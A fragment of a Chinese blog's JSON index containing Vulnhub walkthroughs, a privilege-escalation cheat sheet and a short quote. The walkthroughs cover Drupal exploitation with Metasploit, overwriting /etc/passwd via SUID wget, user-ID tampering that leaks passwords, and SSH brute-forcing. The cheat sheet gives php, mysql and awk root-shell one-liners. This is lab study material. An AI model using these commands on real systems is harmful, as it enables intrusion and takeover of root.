/etc/network/interfaces看一下配置信息用的是哪一个网卡，把它们都改为ens33：/etc/init.d/networking/interfaces重启网卡后，重新启动靶机。\n\n此时靶机启动后，在攻击机上进行主机扫描时应能扫描到。\n\n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)和80(http)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码是一个apache2的默认页面，没有发现什么。dirb扫描web目录dirb http://192.168.xxx.xxx :访问http://192.168.117.134/drupal :该目录是一个内容管理系统。访问http://192.168.117.134/drupal/robots.txt :查看文件CHANGELOG.txt，获得版本信息：  \n\n3.getshell(msf)\n通过metasoploit搜索expsearch drupal：由于攻击目标不在根目录下，故需设置targeturi到对应目录/drupal：获取shell：将其转换成交互式的shell，先查看使用python版本：python&gt;3使用python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;：ls -a查看 /var/www/html 下的文件及文件夹：查看可疑文件alexander.txt：看上去经过base64加密，丢到网上解码器去解码：解码后的内容还是一段加密内容，查了一下发现像是经过brainfuck加密后的密文，继续解码：得到一个用户名和密码james:Hacker@4514，尝试直接su &lt;用户名&gt;切换登录：登陆失败，说明这套账户密码要么是闹你玩儿，要么是没有登陆权限。cat /etc/passwd 查看用户，发现是有james的，进入他的工作目录/home/james看一下，查看可疑文件user.txt:拿到第一个flag.txt    \n\n4. 提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo提权，因不知道当前用户的密码故不可行：尝试suid提权find / -perm -u=s -type f 2&gt;/dev/null:利用wget：用python3在靶机里搭建一个建议服务器python3 -m http.server 8888(我这里先切换到 /etc 是为了一会获取文件时候省得输入路径，就直接切换到文件所在路径下了)通过攻击机将靶机里的passwd文件通过wget下载出来(上一步如果没有切换到/etc去搭建服务器的话，就要输入完整的文件所在路径)wget http://192.168.117.134:8888/passwd在攻击机上创建一个本地加密用户：openssl passwd -l -salt cyytest 123456\n\n注意此处的用户名必需≥5，否则会失败气死  \n\n将刚创建的加密的本地用户添加到passwd中：&lt;用户名&gt;:&lt;加密后的内容&gt;0:0:0::/root:/bin/bash同样在攻击机上搭建一个服务器：在靶机上将攻击机上的passwd文件通过wget下载并覆盖原有的passwd:通过账户密码 cyytest:123456 登录，成功获取root权限：查看root.txt，拿到第二个flag:    \n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","Metasoploit"]},{"title":"Vulnhub|Me and My Girlfriend","url":"/6ceb590b.html","content":"0.靶机安装\n使用NAT模式，保证与攻击机kali在同一网段内：\n\n1.信息收集\n主机扫描root@kali:~# nmap 192.168.xxx.0/24开放了ssh(22)和http(80)。\n\n2.(80端口)web安全\n2.1 web访问，查看页面源代码提示利用x-forward-for，在浏览器借助工具在请求头中加入 X-Forward-For:127.0.0.1 ,访问成功：注册一个账号用户登录：使用注册的账户登录：2.2 水平越权点击profile，请求中带有参数user_id：通过编辑user_id，能够获得其他用户的信息,存在水平越权：  \n\n此处可以通过样式编辑器编辑元素类型为text，即可将密码明文显示：  \n\n通过上述操作，可以收集到每个用户对应的账号与密码：\n\n\n\nusername\npassword\n\n\n\n\neweuhtandingan\nskuyatuh\n\n\naingmaung\nqwerty!!!\n\n\nsundatea\nindONEsia\n\n\nsedihaingmah\ncedihhihihi\n\n\nalice\n4lic3\n\n\n\n\n3.(22端口)SSH\n虽然通过2.2收集到的账户与密码，但不知道具有ssh登陆权限的账户密码是哪一个。将账户密码分别存储为uname.txt和passwd.txt：getshell (SSH爆破)root@kali:~# nmap -p 22 --script=ssh-brute --script-args userdb=uname.txt,passdb=passwd.txt 192.168.xxx.xxx获得可用账户密码：alice/4lic3 ：  \n\n使用Xshell远程登陆(ssh登陆的方式很多，直接用 ssh alice@&lt;靶机ip&gt; 也行)  \n\n“我是谁？我在哪？我有啥？”\n\n\n\n口令\n解释\n\n\n\n\nwhoami\n显示当前用户\n\n\npwd\n显示工作路径\n\n\nls -a\n当前目录下所有文件夹及文件\n\n\n\n显示可疑目录.my_secret 进入后 ls -a，查看flag1.txt，文件包含flag，及提示需要获得root权限才能得到另一个flag：  \n\n4.提权\n\n2021-12-01发布的提权相关文章提权sudo提权 (这里尝试sudo提权时发现具有提权条件，故暂不尝试其他提权方式)查询具有sudo权限命令：sudo -l\n尝试使用sudo-php提权(命令的含义我也不太懂，把它当作一种固定的语句吧):  CMD=\"/bin/sh\"  \nsudo php -r \"system('$CMD');\"\n使用 whoami 提权成功：进入 /root 目录，查看文件，找到flag2.txt：  \n\n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","水平越权","SSH爆破"]},{"title":"提权","url":"/e2181504.html","content":"提权途径\n\nsudo  sudo -l //查询具有sudo权限命令\nsuid  \n\n\nSUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。其中，大家熟知的具有提权功能的Linux可执行文件包括：\n\nfind / -perm -u=s type f 2>/dev/null //查询具有suid执行权限程序\n可利用的程序：nmap、vim、find、bash、more、less、nano、cp、wget  \n\n通过在/etc/passwd添加一个root权限账户  find / -writable -type f 2>/dev/null //查询可写权限的文件\n查看/etc/cron*下所含的所有文件  ls -la /etc/cron* //cron*是用来让使用者在固定时间或固定时间间隔执行程序之用(类似使用者的时程表),攻击者可根据root执行的程序寻找exp。\n\n\n\n提权\n\nphp  \n\n\nsudoCMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\nsuidsudo sh -c 'cp $(which php) .; chmod +s ./php'\nCMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh',['-p']);\"\n\n\nmysql  \n\n\nsudosudo -u root mysql -e '\\! /bin/bash'\n\n\nawk/mawk  \n\n\nsudosudo /usr/bin/awk '&#123;system(\"/bin/bash\")&#125;'\nmawk 'BEGIN &#123;system(\"/bin/sh\")&#125;'\n\n\n","categories":["渗透测试"],"tags":["提权"]},{"title":"勇敢一点","url":"/b822f9c7.html","content":"“Your time and energy are scarce resources. Do not waste them on trivial people or things. Do not answer unjustified questions, or reply curious comments. Ignore them all. Spend more time with wise peers. Read sparkling thoughts on books. Stay sharp, stay alone. “\n","categories":["随记"],"tags":[]}]